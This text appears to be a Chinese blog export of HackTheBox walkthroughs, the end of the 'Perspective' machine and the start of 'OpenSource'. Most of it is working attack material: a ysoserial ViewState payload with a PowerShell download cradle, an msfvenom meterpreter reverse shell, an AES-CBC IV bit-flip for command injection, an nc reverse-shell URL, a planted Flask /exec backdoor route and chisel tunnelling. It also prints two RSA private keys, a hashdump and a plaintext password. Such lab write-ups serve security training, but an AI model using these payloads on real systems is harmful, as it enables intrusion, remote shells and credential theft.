type=\"text/javascript\"&gt;document.getElementById('Pwnform').submit();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ViewState 反序列化拿到ViewStateUserKey，后续就是反序列化,其他需要的信息都在前面的web.config中可以得到： Exploiting __VIEWSTATE knowing the secrets - HackTrickshttps://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret#rce-with-enabled-viewstate-mac-validation 123C:\\Users\\miao\\Desktop\\ysoserial-1.34\\Release&gt;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8/Invoke-PowerShellTcp.ps1')\" --generator=0414C274 --validationalg=\"SHA1\" --viewstateuserkey=\"SAltysAltYV1ewSTaT3\" --validationkey=\"99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF\"/wEy8gcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACUBjw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBwb3dlcnNoZWxsIElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzEwLjEwLjE0LjgvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxJykiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+C7/gorYt5fyOhhM5rE+jbNw0GNpw 还是普通用户新建商品那里替换，触发反序列化，得到reverse shell： user flag得到的webuser用户桌面，user.txt: webuser_id_rsa这个windows启用了ssh，当前用户.ssh目录也给出了私钥，方便后续操作： 123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAzfoQwqu9tIYiy694HbGmT+qw2b+kUTnEcqEOEXv5+vLcVqZ2APlHTSDj4rSzv+tJoHQiRf3IyVpNNqGw8+wM+P3wdozY66BUPHqz6FpRHxcMT2SsNk9J9hxTi2L3oBVR83F0abBWnOClOqjrd8SMVRcyCi1&#x2F;svSdOP8OPh9s+mpa5TG2KEiI66whlBKKC1N2szF4rQNtkCGUw66zheHSxK5j6axjiP0sstC6hUJy2uqu3DXK0dOtwMUk5EOpkFPTZxlIzgbUI&#x2F;CcQ8ipaankvrHrh8x8DKdv9KspzKhLflS5Ayie3PyFQ5lg9TCLk4dzyeB8YkBkBEXUbCePvNBFRwIDAQABAoIBAFwtqeyE0TwFv3KqDzYyt3wSSpzYD+At2wV1oAchFWlB4GuCyVJ8PHV+350oQz0DPgrpjiEGhyHdIKrvR3KR0+hmNIPJWpZwROJgAz1blew081RgeFVBvJbAbH73hlwEzo0E3BUkTk6cljUfPWl281ptK&#x2F;60B+79W5MTSbtxcuLJgcvB&#x2F;REYU3GPUK&#x2F;dTSVU7IMV2hBrFP6srlqTaGZ2ugm6xNV14Iq0KOpuHfYXXSdkklOt+eSZ8AWTQTkZtSfLJUybOaLYStOGn35SIupwD4kxZbAtX54Avdi8rq61H4TIrM82B2+UpPkdd2P6am822mlQa4lVrnJCbq88z6Xv6ckCgYEA9+lwddycXp0A4WlhmIu5A1440uZELhAfeRlBQVpeqlF0Ig2XjUybWhEu+lMlEfbsiWK&#x2F;rfIp53uuBkstXc2ImKfhSbys8KMkJKq6Fp+OjbbFYSIS9mSPf91W658OtfoNG&#x2F;UHPp74f6&#x2F;mogsbKpNP0nPDnjFBQLMuL2pYO&#x2F;Q7p2sCgYEA1LJibPM&#x2F;rpbzyGjJSYd50xNP1ftaUyZwRWCWAgAWLXKVVbuNdPNy6GvjyaNkJcPz3dh+zSsLZeSyyVWUvFQslkkZaMvWZVDdwh9x8i3N&#x2F;NhhTbqVTyBBqWTyk0l0WJVcHtUbq6kSIYucmw&#x2F;zH9qlpfYHvMWZN2kSHq+kwlMAfJUCgYBmTSpfOJ4+XMOUQQxJCr9aKHOCdAsGhxi1vDo1YblWxy4JL1qusEIbNKQSIGVXuHF7cAhxG1E3eM4jQrqBzuLjO8O3zef&#x2F;lRLBHsKTu1v0Fsv0fT8d9flRZmEL8iL77SejtcU7jhY1erzNeY&#x2F;ITenOin7atLCcplQUtOmcM&#x2F;i56QKBgQDRjiMNBqfSYqUy6ZKPoCt1u4wn3eoDDFcG838330&#x2F;6XO8mtY9MD2NB&#x2F;LJDgnh0ANiu1NMxXtxu+mDvniLZXfFD7CddqZ7E2WRzEroYCert114ez9q1R6mJtIyOcotvj1BgjEQj34KejEeyOoel9azIk1rSMLig8CNLGnAwiMhs9QKBgQC6pv2GxsrQmUEPiE0vorFtMulMi7vRYe7kfgsohE8grqKzsveLQJokR+67L9QcuLwo2OWng2d2oEFkx9dx++ewEluo8ZjcOx3TVDIIZDUw4KdD0Q&#x2F;josqpRhZbZ6EF094JTnINnexb9OhQMwQJHAhp63o5dH6fFXSTUpW10u+mkA&#x3D;&#x3D;-----END RSA PRIVATE KEY----- 信息8009端口，转发出来，看起来和之前的网站一样 1ssh -i webuser_id_rsa webuser@10.10.11.151 -L 8009:127.0.0.1:8009 perespective.dll.net dll反编译，分析代码，重点是token那部分 12C:\\WEBAPPS\\PartImages_Staging\\bin\\perespective.dllC:\\WEBAPPS\\PartImages_Prod\\bin\\perespective.dll 密码学领域内容了，token使用AES CBC,前16字节是iv 大概是调用本地命令修改密码，命令注入 CBC attack123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# 重置密码请求，邮箱填充到16位，获得token解码a@a.aa++++++++++$ echo -n vedAtEi1tb8mS67dUSv1CqojLHQPIfwhGxdUofWkhaN40d1KbzY7tKS0gZjr1CMZ | base64 -d| xxd -p| tr -d \"\\n\"bde740b448b5b5bf264baedd512bf50aaa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319# 创建shell，上传到服务器上msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe &gt; shell.exemeterpreter &gt; pwdC:\\xmeterpreter &gt; upload /Users/miao/use_miao_wwwwwww/Hacking/HackTheBox/Perspective/shell.exemv shell.exe x.exe# 前16个字节，即10进制的前32，是IV&gt;&gt;&gt; data = \"bde740b448b5b5bf264baedd512bf50aaa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319\"&gt;&gt;&gt; data[:32]'bde740b448b5b5bf264baedd512bf50a'两个xor# 第一个，原本邮箱# 6140612e616120202020202020202020# a@a.aa# 第二个地方，修改后的命令注入# 原本的 6140612e6161265c785c782e65786520# a@a.aa&amp;\\x\\x.exe https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'6140612e616120202020202020202020'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'6140612e6161265c785c782e65786520'%7D,'Standard',false)To_Hex('None',0)&amp;input=YmRlNzQwYjQ0OGI1YjViZjI2NGJhZWRkNTEyYmY1MGEbde740b448b5b5bf264baedd512bf50a-&gt;bde740b448b5b3c37e37f6d31473b00a得到的结果作为新的IV：&gt;&gt;&gt; data[32:]'aa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319'&gt;&gt;&gt; \"bde740b448b5b3c37e37f6d31473b00a\" + 'aa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319''bde740b448b5b3c37e37f6d31473b00aaa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319'# 生成新tokenhttps://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Simple%20string','string':'%2B'%7D,'-',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'/'%7D,'_',true,false,true,false)&amp;input=YmRlNzQwYjQ0OGI1YjNjMzdlMzdmNmQzMTQ3M2IwMGFhYTIzMmM3NDBmMjFmYzIxMWIxNzU0YTFmNWE0ODVhMzc4ZDFkZDRhNmYzNjNiYjRhNGI0ODE5OGViZDQyMzE5vedAtEi1s8N-N_bTFHOwCqojLHQPIfwhGxdUofWkhaN40d1KbzY7tKS0gZjr1CMZ# 注意前面得到token那里一直中断在那里，不要forward# 替换新token，重定向到修改密码界面，修改密码发送，触发命令注入 root flagAdministrator桌面，root.txt: hash123456789meterpreter &gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3ebc094377ee665f31a78f536ba4f1af:::dbuser:1003:aad3b435b51404eeaad3b435b51404ee:ffdd348640d3215cfe351d5cf928cb93:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::sqladmin:1001:aad3b435b51404eeaad3b435b51404ee:17e1ecc085fb5fd49810495ca173052e:::sshd:1005:aad3b435b51404eeaad3b435b51404ee:4edb911b4f987283a91a175c6d4445bb:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7cd9849be63b88b3f4e910cdae120f3d:::webuser:1004:aad3b435b51404eeaad3b435b51404ee:9c101375df857fad5e6bec682ffa4187::: 参考资料 ASP Including Fileshttps://www.w3schools.com/asp/asp_incfiles.asp payloadbox/xss-payload-list: 🎯 Cross Site Scripting ( XSS ) Vulnerability Payload Listhttps://github.com/payloadbox/xss-payload-list#xss-payload-list Exploiting __VIEWSTATE knowing the secrets - HackTrickshttps://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret#rce-with-enabled-viewstate-mac-validation Block cipher mode of operation - Wikipediahttps://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC) HTB Perspective - Admin part | BreachForumshttps://breached.co/Thread-HTB-Perspective-Admin-part Hack-The-Box-walkthrough[Perspective] | lUc1f3r11’s bloghttps://fdlucifer.github.io/2022/04/10/Perspective/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OpenSource - HackTheBox","slug":"OpenSource-HackTheBox","date":"2022-05-24T04:29:03.000Z","updated":"2022-10-09T01:47:47.889Z","comments":true,"path":"2022/05/24/OpenSource-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/05/24/OpenSource-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/471 10.10.11.164 端口扫描22,80,和一个被过滤的3000: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899$ nmap -sC -sV 10.10.11.164Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-24 10:28 CSTNmap scan report for 10.10.11.164Host is up (0.070s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)| 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)|_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)80/tcp open http Werkzeug/2.1.2 Python/3.10.3|_http-server-header: Werkzeug/2.1.2 Python/3.10.3|_http-title: upcloud - Upload files for Free!| fingerprint-strings:| GetRequest:| HTTP/1.1 200 OK| Server: Werkzeug/2.1.2 Python/3.10.3| Date: Tue, 24 May 2022 02:29:04 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 5316| Connection: close| &lt;html lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"UTF-8\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;| &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;| &lt;script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/vendor/popper/popper.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/js/ie10-viewport-bug-workaround.js\"&gt;&lt;/script&gt;| &lt;link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/&gt;| &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/&gt;| &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/&gt;| &lt;link rel=| HTTPOptions:| HTTP/1.1 200 OK| Server: Werkzeug/2.1.2 Python/3.10.3| Date: Tue, 24 May 2022 02:29:04 GMT| Content-Type: text/html; charset=utf-8| Allow: GET, HEAD, OPTIONS| Content-Length: 0| Connection: close| RTSPRequest:| &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"| \"http://www.w3.org/TR/html4/strict.dtd\"&gt;| &lt;html&gt;| &lt;head&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;| &lt;title&gt;Error response&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;Error response&lt;/h1&gt;| &lt;p&gt;Error code: 400&lt;/p&gt;| &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;| &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;| &lt;/body&gt;|_ &lt;/html&gt;3000/tcp filtered ppp1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port80-TCP:V=7.92%I=7%D=5/24%Time=628C42F0%P=x86_64-apple-darwin20.4.0%SF:r(GetRequest,1573,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.SF:2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Tue,\\x2024\\x20May\\x202022\\x2002:29:04\\SF:x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-LengtSF:h:\\x205316\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;SF:\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"UTF-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x2SF:0name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\SF:.0\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;upcloud\\x20-\\x20Upload\\x20files\\x20for\\x2SF:0Free!&lt;/title&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\\"/static/vendor/jquerSF:y/jquery-3\\.4\\.1\\.min\\.js\\\"&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\SF:\"/static/vendor/popper/popper\\.min\\.js\\\"&gt;&lt;/script&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;SF:script\\x20src=\\\"/static/vendor/bootstrap/js/bootstrap\\.min\\.js\\\"&gt;&lt;/scriSF:pt&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\\"/static/js/ie10-viewport-bug-workSF:around\\.js\\\"&gt;&lt;/script&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\xSF:20href=\\\"/static/vendor/bootstrap/css/bootstrap\\.css\\\"/&gt;\\n\\x20\\x20\\x20\\SF:x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"\\x20/static/vendor/bootstrap/cSF:ss/bootstrap-grid\\.css\\\"/&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"SF:\\x20href=\\\"\\x20/static/vendor/bootstrap/css/bootstrap-reboot\\.css\\\"/&gt;\\nSF:\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\")%r(HTTPOptions,C7,\"HTTP/1\\.1\\x20200\\x2SF:0OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Tue,\\SF:x2024\\x20May\\x202022\\x2002:29:04\\x20GMT\\r\\nContent-Type:\\x20text/html;\\SF:x20charset=utf-8\\r\\nAllow:\\x20GET,\\x20HEAD,\\x20OPTIONS\\r\\nContent-LengtSF:h:\\x200\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(RTSPRequest,1F4,\"&lt;!DOCTYPE\\SF:x20HTML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x204\\.01//EN\\\"\\n\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20\\x20\\\"http://www\\.w3\\.org/TR/html4/strict\\.dtd\\\"&gt;\\n&lt;htmSF:l&gt;\\n\\x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20htSF:tp-equiv=\\\"Content-Type\\\"\\x20content=\\\"text/html;charset=utf-8\\\"&gt;\\n\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;title&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\SF:x20\\x20&lt;/head&gt;\\n\\x20\\x20\\x20\\x20&lt;body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0&lt;h1&gt;Error\\x20response&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\xSF:20code:\\x20400&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Bad\\SF:x20request\\x20version\\x20\\('RTSP/1\\.0'\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20\\x20&lt;p&gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x2SF:0-\\x20Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.&lt;/p&gt;\\n\\xSF:20\\x20\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 111.31 seconds 80upcloud,提供一份代码下载： upcloud source下载代码分析： upload存在一个上传功能，会调用get_file_name进行过滤把文件名中的 ../ 替换为空，然后通过os.path.join拼接过滤后的文件名，获得最终保存路径，这里可以尝试使用绝对路径覆盖文件，例如views.py,在其中添加恶意路由 123# app/app/utils.pydef get_file_name(unsafe_filename): return recursive_replace(unsafe_filename, \"../\", \"\") 例如这样处理，最终得到的上传文件名将覆盖原本的views.py: shell上传完之后访问运行，得到容器 shell： 1http://10.10.11.164/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.6%204444%20%3E%2Ftmp%2Ff evil views.py123456789101112131415161718192021222324252627import osfrom app.utils import get_file_namefrom flask import render_template, request, send_filefrom app import app@app.route('/', methods=['GET', 'POST'])def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html')@app.route('/uploads/&lt;path:path&gt;')def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))@app.route('/exec')def cmd(): return os.system(request.args.get('cmd')) origin views.py1234567891011121314151617181920212223import osfrom app.utils import get_file_namefrom flask import render_template, request, send_filefrom app import app@app.route('/', methods=['GET', 'POST'])def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html')@app.route('/uploads/&lt;path:path&gt;')def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path)) 容器 隧道容器ip是172.17.0.8,可以直接猜测宿主机ip是172.17.0.1，前面也看到3000端口存在过滤，考虑打通隧道后通过容器去访问宿主机 1234# local./chisel_1.7.0-rc7_darwin_amd64 server -p 6969 --reverse# 容器./chisel_1.7.6_linux_amd64 client 10.10.14.6:6969 R:socks 打通隧道后使用本地1080端口socks代理，通过容器访问宿主机3000端口，是一个gitea gitea前面的source里可以得到密码 123456789git show-branchgit log dev --oneline git show a76f8f7+&#123;+ \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\",+ \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\",+ \"http.proxyStrictSSL\": false+&#125; dev01账号密码登录gitea： home_backup中得到ssh私钥： id_rsa123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051-----BEGIN RSA PRIVATE KEY-----MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg&#x2F;6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0lxfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6Ru2TPqjGvyVZDj3OLRMmNTR&#x2F;OUmzQjpNIGyrIjDdvm1&#x2F;Hkky&#x2F;CfyXUucFnshJr&#x2F;BL7FU4L6ihII7zNEjaM1&#x2F;d7xJ&#x2F;0M88NhS1X4szT6txiB6oBMQGGolDlDJXqA0BN6cFwEza2LLTiogLkCpST2orKIMGZvr4VS&#x2F;xw6v5CDlyNaMGpvlo+88ZdvNiKLnkYrkEWM+N+2c1V1fbWxBp2ImEhAvvgANx6AsNZxZFuupHW953npuL47RSn5RTsFXOaKiUrzJZvoIc7h&#x2F;9Jh0Er8QLcWvMRV+5hjQLZXTcey2dn7S0OQnO2n3vb5FWtJeWVVaNO&#x2F;cZWqNApc2n65HSdX+JY+wznGU6oh9iUpcXplRWNH321s9WKVII2Ne2xHEmE&#x2F;okNk+ZgGMFvD09RIB62t5YWF+yitMDx2E+XSg7bob3EO61zOlvjtY2cgvO6kmn1E5aFX5S6sjxxncq4cj1NpWQRjxzu63SlP5i+3N3QPAH2UsVTVcbsWqr9jbl&#x2F;5h4enkNW0xav8MWtbCnAsmhuBzsLML0+ootNpbagxSmIiPPV1p&#x2F;oHLRsRnJ4jaqoBECAwEAAQKCAgEAkXmFz7tGc73m1hk6AM4rvv7C4Sv1P3+emHqsf5Y4Q63eIbXOtllsE&#x2F;gOWFQRRNoXvasDXbiOQqhevMxDyKlqRLElGJC8pYEDYeOeLJlhS84Fpp7amf8zKEqInaMZHbuOg89nDbtBtbsisAHcs+ljBTw4kJLtFZhJ0PRjbtIbLnvHJMJnSH95MtrzrkDIePIwe&#x2F;KU3kqq1Oe0XWBAQSmvO4FUMZiRuAN2dyVAj6TRE1aQxGyBsMwmb55DO1pxDYA0I3SApKQax&#x2F;4Y4GHCbC7XmQQdo3WWLVVdattwpUa7wMf&#x2F;r9NwteSZbdZtC&#x2F;ZoJQtaofatX7IZ60EIRBGz2axq7t+IEDwSAQp3MyvNVK4h83GifVb&#x2F;C9+G3XbMBmUKlFq&#x2F;g20D225vnORXXsPVdKzbijSkvupLZpsHyygFIj8mdg2Lj4UZFDtqvNSrajlFENjzJ2mXKvRXvpcJ6jDKK+ne8AwvbLHGgB0lZ8WrkpvKU6C&#x2F;ird2jEUzUYX7rw&#x2F;JH7EjyjUF&#x2F;bBlw1pkJxB1HkmzzhgmwIAMvnX16FGfl7b3maZcvwrfahbK++DdbD64rF+ct0knQQw6eeXwDbKSRuBPa5YHPHfLiaRknU2g++mhukE4fqcdisb2OY6sfutu9PMHBpyHWOzO4rJ3qX5mpexlbUgqeQHvsrAJRISAXi0md0ECggEBAOG4pqAPIbL0RgydFHwzj1aJ&#x2F;+L3Von1jKipr6Qlj&#x2F;umynfUSIymHhhikac7awCqbibOkT4hXJkJGiwjAe4AI6&#x2F;LUOLLUICZ+B6vo+UHP4ZrNjEK3BgP0JC4DJ5X&#x2F;S2JUfxSyOK+Hh&#x2F;CwZ9&#x2F;6&#x2F;8PtLhe7J+s7RYuketMQDl3MOp+MUdf+CyizXgYxdDqBOo67t4DxNqsttnakRXotUkFAnWWpCKD+RjkBkROEssQlzrMquA2XmBAlvis+yHfXaFj3j0coKAaEnt6NIs&#x2F;B8a&#x2F;VRMiYK5dCgIDVI9p+Q7EmBL3HPJ+29A6Eg3OG50FwfPfcvxtxjYwFq338ppt+Co0wd8CggEBAMCXiWD6jrnKVJz7gVbDip64aa1WRlo+auk8+mlhSHtNj+IISKtyRF6qeZHBDoGLm5SQzzcg5p&#x2F;7WFvwISlRN3GrzlD92LFgj2NVjdDGRVUkkIVKRh3P9Q4tzewxFoGnmYcSaJwVHFN7KVfWEvfkM1iucUxOj1qKkD1yLyP7jhqajxEYrr4+j1HWWmb7Mvep3X+1ZES1jyd9zJ4yji9+wkQGOGFkfzjoRyws3vPLmEmvVeniuSclLlX3xL9CWfXeOEl8UWd2FHvZN8YeK06s4tQwPM&#x2F;iy0BE4sDQyae7BO6RidvvvD8UInqlc+F2n1X7UFKuYizOiDz0D2pAsJI9PA8CggEBAI&#x2F;jNoyXuMKsBq9pvrJB5+ChjbXwN4EwP18Q9D8uFq+zriNe9nR6PHsM8o5pSReejSM90MaLW8zOSZnTIxrFifo5IDHCq2mfPNTK4C5SRYN5eo0ewBiylCB8wsZ5jpHllJbFavtneCqE6wqy8AyixXA2Sp6rDGN0gl49OD+ppEwG74DxQ3GowlQJbqhzVXi+4qAyRN2k9dbABnax5kZK5DtzMOQzvqnISdpm7oH17IF2EINnBRhUdCjHlDsOeVA1KmlIg3grxpZh23bcUie2thPBeWINOyD3YIMfab2pQsvsLM7EYXlGW1XjiiS5k97TFSinDZBjbUGu6j7ZVTYKdX8CggEAUsAJsBiYQK314ymRbjVAl2gHSAoc2mOdTi&#x2F;8LFE3cntmCimjB79mLwKyj3TTBch1hcUes8I4NZ8qXP51USprVzUJxfT8KWKi2XyGHaFDYwz957d9HwwecAQwSX7h+72GkunO9tl&#x2F;PUNbBTmfFtH&#x2F;WehCGBZdM&#x2F;r7dNtd8+j&#x2F;KuEj&#x2F;aWMV4PL0s72Mu9V++IJoPjQZ1FXfBFqXMK+Ixwk3lOJ4BbtLwdmpU12Umw1N9vVX1QiV&#x2F;Z6zUdTSxZ4TtM3fiOjWn&#x2F;61ygC9eY6l2hjYeaECpKY4Dl48H4FV0NdICB6inycdsHw+p+ihcqRNcFwxsXUuwnWsdHv2aiH9Z3H8wKCAQAlbliq7YW45VyYjg5LENGmJ8f0gEUu7u8Im+rY+yfW6LqItUgCs1zIaKvXkRhOd7suREmKX1&#x2F;HH3GztAbmYsURwIf&#x2F;nf4P67EmSRl46EK6ynZ8oHW5bIUVoiVV9SPOZv+hxwZ5LQNK3o7tuRyA6EYgEQllo5tZ7zb7XTokw+6uF+mQriJqJYjhfJ2oXLjpufS+id3uYsLKnAXX06y4lWqaz72MNfYDE7uwRhS1PwQyrMbaurAoI1Dq5n5nl6opIVdc7VlFPfoSjzixpWiVLZFoEbFBAE77E1AeujKjRkXLQUO3z0E9fnrOl5dXeh2aJp1f+1Wq2Klti3LTLFkKY4og-----END RSA PRIVATE KEY----- user flag使用得到的私钥登录dev01用户，得到user.txt: 